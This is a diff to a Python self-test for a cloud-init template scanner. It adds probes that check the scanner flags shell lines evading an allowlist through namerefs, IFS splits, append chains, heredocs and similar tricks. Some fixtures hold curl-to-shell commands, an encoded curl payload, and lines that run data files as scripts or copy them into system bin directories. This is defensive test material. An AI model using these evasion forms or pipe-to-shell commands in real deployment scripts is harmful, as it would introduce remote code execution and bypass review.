+        ('data-home file run by a dot after PATH, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      PATH=/etc/ai-memory:$PATH; . run.conf\n" + dec)]),
+        ('data-home file run as an unresolved operand, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      F=$(cat /etc/x); bash \"$${F}\"\n" + dec)]),
+        ('data-home file run as an unresolved stdin target, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      read F < /etc/x; bash < \"$${F}\"\n" + dec)]),
+        ('data-home file run through a default operator on an empty name, listed (#4837 R12 R5, #5173)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      A=; bash "$${A:-/etc/ai-memory/run.conf}"\n' + dec)]),
+        ('data-home file run through a suffix operator, listed (#4837 R12 R5, #5173)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      A=/etc/ai-memory/run.conf.x; bash "$${A%.x}"\n' + dec)]),
+        ('data-home file run through an append-built path, listed (#4837 R12 R5, #5174)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/run; F+=.conf; bash "$F"\n' + dec)]),
+        ('data-home file run through an append-built path with a suffix, listed (#4837 R12 R5, #5174)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/run; F+=.conf; bash "$F".x\n' + dec)]),
+        ('data-home file copied through an append chain past the value cap, listed (#4837 R12 R5, #5329)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/r; F+=u; F+=n; F+=.; F+=c; F+=o; F+=n; F+=f; cp "$F" /usr/local/bin/\n' + dec)]),
+        ('data-home file copied through an append repeated by a loop, listed (#4837 R12 R5, #5330)', [(PROV, wf("/etc/ai-memory/aaa", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/a; for i in 1 2; do F+=a; done; cp "$F" /usr/local/bin/\n' + dec)]),
+        ('data-home file copied through a split append value, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      F=/etc/ai-memory/r; F+=\"un.conf /x\"; cp $F /usr/local/bin/\n" + dec)]),
+        ('data-home file copied through a field of an IFS split, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      IFS=:; F=x:/etc/ai-memory/r; F+=u*; cp $F /usr/local/bin/\n" + dec)]),
+        ('data-home file copied through a nameref, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      F=/etc/ai-memory/r; F+=un.conf; declare -n R=F; cp \"$R\" /usr/local/bin/\n" + dec)]),
+        ('data-home file built through a nameref and copied through its target, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      declare -n R=G; R=/etc/ai-memory/r; R+=un.conf; cp \"$G\" /usr/local/bin/\n" + dec)]),
+        ('data-home file run through a nameref, listed (#4837 R12 R5, #5174)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      declare -n R=A; A=/etc/ai-memory/run.conf; bash "$R"\n' + dec)]),
+        ('data-home file copied by tee from its stdin, then the copy run, listed (#4837 R12 R5, #5096)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      tee /usr/local/bin/r.sh < /etc/ai-memory/run.conf > /dev/null\n      bash /usr/local/bin/r.sh\n" + dec)]),
+        ('data-home file copied by sed in a redirected group, then the copy run, listed (#4837 R12 R5, #5096)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      { sed 's/a/a/' /etc/ai-memory/run.conf; } > /usr/local/bin/r.sh\n      bash /usr/local/bin/r.sh\n" + dec)]),
+        ('data-home file named by echo in a substitution, then the copy run, listed (#4837 R12 R5, #5096)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      taskset -c 0 \"$(echo /etc/ai-memory/run.conf)\".x\n      bash /usr/local/bin/r.sh\n" + dec)]),
+        ('data-home file read by tee in a substitution, then the copy run, listed (#4837 R12 R5, #5096)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      taskset -c 0 \"$(tee < /etc/ai-memory/run.conf)\".x\n      bash /usr/local/bin/r.sh\n" + dec)]),
+        ('data-home file run by a unit ExecStartPre through a doubled slash, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (ENVF, ENVF + "      ExecStartPre=/bin/sh /etc//ai-memory/run.conf\n")]),
+        ('no-shebang write_files file run as a command, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      /etc/ai-memory/run.conf\n" + dec)]),
+        ('no-shebang write_files file at mode 0755, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0755", ["${X} --db /x stats"]))]),
+        ('no-shebang write_files file outside the data homes, listed (#4837 R12 R5)', [(PROV, wf("/etc/default/ai-memory-run", "0644", ["${X} --db /x stats"]))]),
+        ('no-shebang write_files file named by an absolute glob, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      for f in /etc/ai-memory/*.conf; do . \"$f\"; done\n" + dec)]),
+        # the directory is not named ai-memory, so only the parent-directory test sees it
+        ('no-shebang write_files file run through its directory, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/hooks.d/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      run-parts /etc/ai-memory/hooks.d\n" + dec)]),
+        ('data file made executable by chmod, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      chmod 0755 /etc/ai-memory/run.conf\n" + dec)]),
+        ('data file read by sed with an e flag, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      sed -n 's/a/b/e' /etc/ai-memory/run.conf\n" + dec)]),
+        ('heredoc written to a data home then run, listed (#4837 R12 R5)', [(dec, "      cat > /etc/ai-memory/run.conf <<'EOF'\n      ${X} --db /x stats\n      EOF\n      bash /etc/ai-memory/run.conf\n" + dec)]),
+        ('heredoc written by tee, listed (#4837 R12 R5)', [(dec, "      tee /etc/ai-memory/run.conf >/dev/null <<'EOF'\n      ${X} --db /x stats\n      EOF\n" + dec)]),
+        # the first assignment names a data home: only the single-assignment test keeps D from being a constant
+        ('heredoc through a variable assigned twice, listed (#4837 R12 R5)', [(dec, '      D=/etc/ai-memory\n      D=/usr/local/bin\n      cat > "$${D}/run.conf" <<\'EOF\'\n      ${X} --db /x stats\n      EOF\n' + dec)]),
+        ('ai-memory terraform value in a redirection target, listed (#4837 R12 R3, #5099)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x >${X} stats\n' + dec)]),
+        ('ai-memory terraform value in a separate redirection target, listed (#4837 R12 R3, #5099)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x 2> ${X} stats\n' + dec)]),
+        ('ai-memory quoted terraform value in a stdin redirection target, listed (#4837 R12 R3, #5099)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory <"${X}" stats\n' + dec)]),
+        ('ai-memory directive in a redirection target, listed (#4837 R12 R3, #5099)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory 2>%{ if c }/x%{ endif } stats\n' + dec)]),
         ("eval indented below the content block, listed (#4836)", [(dec, dec + '    eval "$PRE"\n')]),
         ("eval indented to the write_files key, listed (#4836)", [(dec, dec + '  eval "$PRE"\n')]),
         ("write_files encoding b64, listed", [(PROV, "  - path: /etc/x.sh\n    encoding: b64\n    content: |\n      Y3VybCBodHRwczovL3g=\n" + PROV)]),
+        # pins for range checks no probe reached (each mutant survived the tip self-test)
+        ('tar --to-command naming the binary, listed (#4837 R12 R4 pin, #5100)', [(dec, '      tar -xf /x.tar --to-command /usr/local/lib/ai-memory/bin/ai-memory\n' + dec)]),
+        ('ai-memory flag word holding an expansion, listed (#4837 R12 R1 pin, #5100)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --$${F} stats\n' + dec)]),
+        ('data file copied by install without -d, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      install -m 0755 /etc/ai-memory/run.conf /usr/local/bin/x\n" + dec)]),
+        ('data file run from an executed heredoc file, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      cat > /etc/ai-memory/b.conf <<'EOF'\n      bash /etc/ai-memory/run.conf\n      EOF\n      bash /etc/ai-memory/b.conf\n" + dec)]),
+        ('heredoc fed to batch, listed (#4837 R12 R5 pin, #5100)', [(dec, "      batch > /etc/ai-memory/run.conf <<'EOF'\n      ${X} --db /x stats\n      EOF\n" + dec)]),
+        ('data file run inside sh -c after cd, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      sh -c 'cd /etc/ai-memory && bash run.conf'\n" + dec)]),
+        ('data file run inside a command substitution, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      echo "$(bash /etc/ai-memory/run.conf)"\n' + dec)]),
+        ('heredoc fed to cat with only stderr redirected, listed (#4837 R12 R5 pin, #5100)', [(dec, "      cat 2>/etc/ai-memory/x.conf <<'EOF'\n      ${X} --db /x stats\n      EOF\n" + dec)]),
+        # pins for checks no probe reached in round 11 (each mutant survived the self-test, #5100)
+        ('data file run by a relative name inside bash -c after cd, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash -c 'cd /etc; . ai-memory/run.conf'\n" + dec)]),
+        ('unknown command with an operand built from an expansion after a slash, listed (#4837 R12 R4 pin, #5100)', [(dec, '      foo /opt/$N stats\n' + dec)]),
+        ('find -exec with no binary operand, listed (#4837 R12 R4 pin, #5100)', [(dec, "      find /opt -name x -exec touch /opt/y ';'\n" + dec)]),
+        ('cp under xargs with no binary operand, listed (#4837 R12 R4 pin, #5100)', [(dec, '      ls /opt | xargs cp -t /opt/x\n' + dec)]),
+        ('data file under a root directory operand, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      foo /\n' + dec)]),
+        ('data file written to a path with a dot segment, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/./run.conf", "0644", ["${X} --db /x stats"])), (dec, '      bash /etc/ai-memory/run.conf\n' + dec)]),
+        ('data file named by two variables assigned twice, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-; P=/etc/ai-; Q=memory/run.conf; Q=memory/run.conf; bash "$P$Q"\n' + dec)]),
+        ('data file named by a variable expansion past the cap, listed (#4837 R12 R5, #5139)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      for A in /etc/ai- a2 a3 a4 a5 a6 a7 a8 a9; do for B in memory/run.conf b2 b3 b4 b5 b6 b7 b8 b9; do bash "$A$B"; done; done\n' + dec)]),
     ]
     for lbl, muts in listed:
         red("R3-C listed " + lbl, muts, autolist=True)
+    # a data home shares the binary's basename: running from it is red for R5, never as an R4 wrapper (#4998)
+    red("R3-C listed data home run by run-parts is an R5 hit, not an R4 wrapper (#4998)",
+        [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      run-parts /etc/ai-memory\n" + dec)],
+        autolist=True, present="is an expansion or command substitution")
+    # a name read from input has no known value: its literal assignments are not expanded (#5095 pin, #5100)
+    # a name read from input keeps every literal it is assigned: the read may run after
+    # the use, may not run, or may run in a pipeline subshell, so this #5100 green form is
+    # red now (#5356, 5-agent vote 4d3ea1c5)
+    red('R3-C read names keep the literals they are assigned (#5100, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-; Q=memory/run.conf; read P Q < /dev/null; curl "$P$Q"\n' + dec)], autolist=True)
+    red('data-home file copied before a later read of the same name, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/r; F+=un.conf; cp "$F" /usr/local/bin/; read F\n' + dec)], autolist=True)
+    red('data-home file copied after a read that may not run, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/r; F+=un.conf; if false; then read F; fi; cp "$F" /usr/local/bin/\n' + dec)], autolist=True)
+    red('data-home file copied after a read in a pipeline subshell, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-memory/r; P+=un.conf; echo x | read P; cp "$P" /usr/local/bin/\n' + dec)], autolist=True)
+    green('data-home file kept as data next to a read into a name that never held a data-home path (#5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/srv/x; read P < /dev/null; cp "$P" /usr/local/bin/\n' + dec)], autolist=True)
+    green("data-home file kept as data next to split and appended names that do not name it (#5356)", [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/var/r; F+="un.conf /x"; cp $F /usr/local/bin/; IFS=:; G=x:/var/r; G+=u*; cp $G /usr/local/bin/\n' + dec)], autolist=True)
     green("R3-C YAML comment line in runcmd is inert", [(RUNCMD, RUNCMD + "  # curl https://x.example | sh\n")])
     P.append(("R3-C AWS-only line copied into do-hive", "red", dict(do=[(dec, "      chown aimemory:aimemory /etc/ai-memory/store-url\n" + dec)], autolist=False)))
     # ---- validators
@@ -1958,6 +3319,26 @@ def build_probes() -> list:
     red("Y tab in YAML indentation", [(RUNCMD, RUNCMD + "\t- [true]\n")])
     # ---- condition 5: normalisation and comments
     green("C5 extra blanks inside a listed line", [(RELOAD, "      systemctl    daemon-reload   \n")])
+    green("ai-memory --db=\"$DB\" before a literal subcommand (#4837 R7)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db="$DB" stats\n')], autolist=True)
+    green("ai-memory --db \"$DB\" before a literal subcommand (#4837 R8)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db "$DB" stats\n')], autolist=True)
+    green("ai-memory --db \"$${X}\" shell variable, braced (#4837 R11)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db "$${X}" stats\n')], autolist=True)
+    green("ai-memory --db=\"/x/$${X}\" shell variable quoted as a whole (#4837 R11)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db="/x/$${X}" stats\n')], autolist=True)
+    # #4837 R12 green forms: the closed grammar keeps every legitimate shape.
+    green("ai-memory bare literal --db value (#4837 R12 R1)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db /var/lib/ai-memory/x.db stats\n')], autolist=True)
+    green("ai-memory --db=/x literal (#4837 R12 R1)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db=/x --json stats >/dev/null 2>&1\n')], autolist=True)
+    green("ai-memory \"$${DB}/x\" braced variable and literal (#4837 R12 R1)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --agent-id "ai:$${H}" --db "$${DB}/x" stats\n')], autolist=True)
+    green("ai-memory --version with redirections before any subcommand (#4837 R12 R1)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --version >/dev/null 2>&1\n      /usr/local/lib/ai-memory/bin/ai-memory --db /x 2> /dev/null stats\n')], autolist=True)
+    green("ai-memory under sudo -u (#4837 R12 R4)", [(RELOAD, RELOAD + '      sudo -u aimemory /usr/local/lib/ai-memory/bin/ai-memory --db /x stats\n')], autolist=True)
+    green("resolved literal variable as an operand and quoted JSON brace (#4837 R12 R4, #5094)", [(RELOAD, RELOAD + '      L=/var/log/x.log; chmod 0640 "$${L}"\n      echo "$${H}" "{\\"a\\": 1}" >/dev/null\n      printf %s "$(date)"\n')], autolist=True)
+    green("data-home file named in canonical-equal spellings by safe commands only (#4837 R12 R5, #5095)", [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} = 1"])), (RELOAD, RELOAD + '      chown root:aimemory /etc//ai-memory/./run.conf\n      D=/etc/ai-memory\n      chmod 0640 "$${D}/run.conf"\n      systemctl restart ai-memory\n')], autolist=True)
+    green("data-home file read by safe commands whose output is discarded (#4837 R12 R5, #5096)", [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} = 1"])), (RELOAD, RELOAD + "      printf %s /etc/ai-memory/run.conf > /dev/null\n      chmod 0640 /etc/ai-memory/run.conf > /dev/null 2>&1\n      { echo a; } > /var/log/x\n")], autolist=True)
+    green("ai-memory installed keeping its name (#4837 R12 R4)", [(RELOAD, RELOAD + '      install -m 0755 /opt/x/ai-memory /usr/local/lib/ai-memory/bin/ai-memory\n      cp /opt/x/ai-memory /opt/y/\n      [ -x /usr/local/lib/ai-memory/bin/ai-memory ] || echo "no /usr/local/lib/ai-memory/bin/ai-memory"\n')], autolist=True)
+    green("data file in a data home handled by chown/chmod/sed (#4837 R12 R5)", [(PROV, wf("/etc/ai-memory/peer.conf", "0640", ["${X} --db /x stats"])), (RELOAD, RELOAD + "      chown root:aimemory /etc/ai-memory/peer.conf\n      chmod 0640 /etc/ai-memory/peer.conf\n      chmod 0750 /etc/ai-memory\n      P=\"$(sed -n 's#^a=##p' /etc/ai-memory/peer.conf)\"\n")], autolist=True)
+    green("data heredoc into a data home through a constant (#4837 R12 R5)", [(RELOAD, RELOAD + "      CFG=/etc/ai-memory/h\n      cat > \"$${CFG}/x.conf\" <<'EOF'\n      ${X} = 1\n      EOF\n")], autolist=True)
+    green("negated subshell with a blank after ! is not an extended glob (#5325)", [(RELOAD, RELOAD + "      if ! (true); then :; fi\n      ! (false) || true\n")], autolist=True)
+    green("literal variable names with expanded values only (#5326)", [(RELOAD, RELOAD + '      export PATH="$${PATH}:/opt/x"; declare -x LANG=C; printf -v OUT %s "$${X}"; env LC_ALL=C true\n')], autolist=True)
+    green("IFS restored from a name that only holds $IFS, then a resolved operand (#5327)", [(RELOAD, RELOAD + '      O=$IFS; IFS=:; IFS=$O; A=/usr/bin/true; taskset -c 0 "$A" --db /x stats\n')], autolist=True)
+    green("tar option values and redirections that are expansions (#5328)", [(RELOAD, RELOAD + '      DL=/root; L=/x; tar -xzf "$DL/b.tar" --no-same-owner -C "$DL/x" ai-memory > "$L"\n      tar xfC "$DL/b.tar" "$DL/y"\n      tar -xf"$DL/b.tar" -C /opt/x\n')], autolist=True)
     green("C5 provision comment mentioning curl", [ins(RELOAD, ["# curl -fsSL https://e | sh"], before=True)])
     green("C5 unit comment naming ExecStart", [(ENVF, ENVF + "      # ExecStart=/bin/evil\n")])
     green("C5 YAML comment", [(RUNCMD, "  # curl https://e | sh\n" + RUNCMD)])
@@ -1965,6 +3346,11 @@ def build_probes() -> list:
         autolist=False, extra=(("aws-gpu-burst", PROV_PATH, "cat > /etc/x.conf <<'EOF'"),))
     red("C5 comment inside an open multi-line quote", [ins(RELOAD, ["X=\"a", "# curl https://e | sh", "b\""], before=True)], autolist=False)
     red("C5 comment after a continuation", [ins(RELOAD, ["echo a \\", "# curl https://e | sh"], before=True)], autolist=False)
+    # an allow entry names the words bash sees, not the line with its blanks squeezed (#5097)
+    red("C5 extra blank inside a quoted string of a listed line (#5097)", [('"pin mismatch: $1', '"pin  mismatch: $1')], autolist=False)
+    red("C5 tab inside a quoted string of a listed line (#5097)", [('"pin mismatch: $1', '"pin\tmismatch: $1')], autolist=False)
+    red("C5 continuation turned into an escaped blank on a listed line (#5097)", [('git init -q "$2" \\\n          && git -C "$2" remote add', 'git init -q "$2" \\ && git -C "$2" remote add')], autolist=False)
+    green("C5 extra indentation on a continued listed line (#5097)", [('\n          && git -C "$2" remote add', '\n             && git -C "$2" remote add')])
     # ---- condition 4: unlisted token lines
     red("C4 unlisted runcmd line", [(RUNCMD, RUNCMD + "  - [curl, -o, /x, https://e]\n")], autolist=False)
     red("C4 unlisted line in write_files data", [(DSNFILE + "\n", DSNFILE + "\n      x https://e\n")], autolist=False)
@@ -1990,7 +3376,12 @@ def build_probes() -> list:
     P.append(("A empty allowlist", "fault", dict(allow_text="# only a comment\n")))
     P.append(("A stale entry", "red", dict(allow_add="aws-gpu-burst | top | nothing-matches:", autolist=False)))
     P.append(("A stale both entry (one template only)", "red", dict(allow_add="both | " + PROV_PATH + " | echo only-in-aws > /x", aws=[ins(RELOAD, ["echo only-in-aws > /x"], before=True)], autolist=False)))
-    P.append(("A stale pending entry", "red", dict(pend_add="do-hive #4671 | top | nothing-matches:", autolist=False)))
+    P.append(("A stale pending entry", "red", dict(pend_sub=("do-hive #4671 | /etc/ai-memory/store-url | ", "do-hive #4671 | top | nothing-matches: "), autolist=False)))
+    # an approved line moved to the pending list skips the validators: the tracker must be known and under its ceiling (#5098)
+    P.append(("A approved line moved under a tracker over its ceiling (#5098)", "fault", dict(pend_move="#4671", autolist=False)))
+    P.append(("A approved line moved under a placeholder tracker #0 (#5098)", "fault", dict(pend_move="#0", autolist=False)))
+    P.append(("A approved line moved under a zero-led tracker #00 (#5098)", "fault", dict(pend_move="#00", autolist=False)))
+    P.append(("A approved line moved under an unknown tracker (#5098)", "fault", dict(pend_move="#99999999", autolist=False)))
     P.append(("A fewer than two templates", "fault", dict(drop_do=True)))
     P.append(("A two templates in one directory", "fault", dict(add_template=("infra/aws-gpu-burst/cloud-init-memory-2.yaml.tpl", "aws"))))
     P.append(("A template with zero triggered lines", "fault", dict(do_text="")))
@@ -2105,6 +3496,16 @@ def case_inputs(base: tuple, spec: dict):
         p = p + first.split(" | ", 1)[0] + " #4671 | " + first.split(" | ", 1)[1] + "\n"
     if "pend_add" in spec:
         p = p + spec["pend_add"] + "\n"
+    if "pend_move" in spec:
+        moved = next(x for x in a.splitlines() if x and not x.startswith("#") and not x.startswith("both | "))
+        a = a.replace(moved + "\n", "", 1)
+        sc, rest = moved.split(" | ", 1)
+        p = p + sc + " " + spec["pend_move"] + " | " + rest + "\n"
+    if "pend_sub" in spec:
+        old, new = spec["pend_sub"]
+        if old not in p:
+            raise RuntimeError("self-test fixture drift in the pending list")
+        p = p.replace(old, new, 1)
     return t, mt, a, p, spec.get("autolist", False), spec.get("extra", ())
 
 
@@ -2150,17 +3551,29 @@ def entry_mutations(base: tuple, cache: dict) -> list:
     return out
 
 
+def probe_failure(label: str, expect: str, got: str, found: list) -> str:
+    """The self-test line for a probe with the wrong verdict: the hit count and up to 3
+    hits whole, so the line names why the probe went red (#5385)."""
+    shown = "".join("\n    " + h for h in found[:3])
+    more = "\n    ... %d more" % (len(found) - 3) if len(found) > 3 else ""
+    return "%s: expected %s, got %s (%d hits)%s%s" % (label, expect, got, len(found), shown, more)
+
+
 def self_test(known: set) -> int:
     base = load_repo()
     cache = {}
     bad, counts = [], {"red": 0, "green": 0, "fault": 0}
     for label, expect, spec in build_probes():
         t, mt, a, p, auto, extra = case_inputs(base, spec)
+        R5_READ_AS_SCRIPT.clear()
         hits, faults, _ = run_scan(t, mt, a, p, known, autolist=auto, extra=extra, cache=cache)
         got = verdict(hits, faults, spec)
         counts[expect] += 1
         if got != expect:
-            bad.append("%s: expected %s, got %s %s" % (label, expect, got, (faults or hits or [""])[0][:140]))
+            why = ["R5: %s is read as script: the use %r names it" % kv for kv in sorted(R5_READ_AS_SCRIPT.items())]
+            bad.append(probe_failure(label, expect, got, why + list(faults or hits)))
+        elif spec.get("present") and not any(spec["present"] in h for h in hits):
+            bad.append("%s: expected a hit naming %r, got none" % (label, spec["present"]))
     muts = entry_mutations(base, cache)
     for raw, nm, text in muts:
         t = dict(base[0])
@@ -2169,6 +3582,15 @@ def self_test(known: set) -> int:
         want = "| tf-region: " if " | tf-region | " in raw else "not in the allowlist"
         if faults or not any(want in h for h in hits):
             bad.append("entry mutation stayed green: " + raw[:100])
+    # each append at least doubles the value set: past EXPAND_CAP it collapses, so a chain
+    # stays linear (#5329); a chain this short passes the cap and keeps a mutant fast
+    chain = [(0, "F+=a%d" % i, 0) for i in range(EXPAND_CAP.bit_length())]
+    if var_values(chain).get("F") != {VALUES_PAST_CAP}:
+        bad.append("an append chain past EXPAND_CAP did not collapse its value set")
+    # a failure line keeps each hit whole (#5385)
+    long_hit = "x" * 150 + " the reason"
+    if long_hit not in probe_failure("p", "green", "red", ["a", long_hit, "b", "c"]):
+        bad.append("a probe failure line cut a hit")
     with contextlib.redirect_stderr(io.StringIO()):
         try:
             build_parser().parse_args(["--bogus"])
@@ -2179,7 +3601,7 @@ def self_test(known: set) -> int:
     if bad:
         print("\n".join("SELF-TEST FAIL: " + b for b in bad), file=sys.stderr)
         return 1
-    print("SELF-TEST PASS: %d red probes flagged, %d green probes clean, %d form faults raised, %d/%d allow-entry mutations red, mistyped argument exits 2"
+    print("SELF-TEST PASS: %d red probes flagged, %d green probes clean, %d form faults raised, %d/%d allow-entry mutations red, append chain past the cap collapses, mistyped argument exits 2"
           % (counts["red"], counts["green"], counts["fault"], len(muts), len(muts)))
     return 0
 
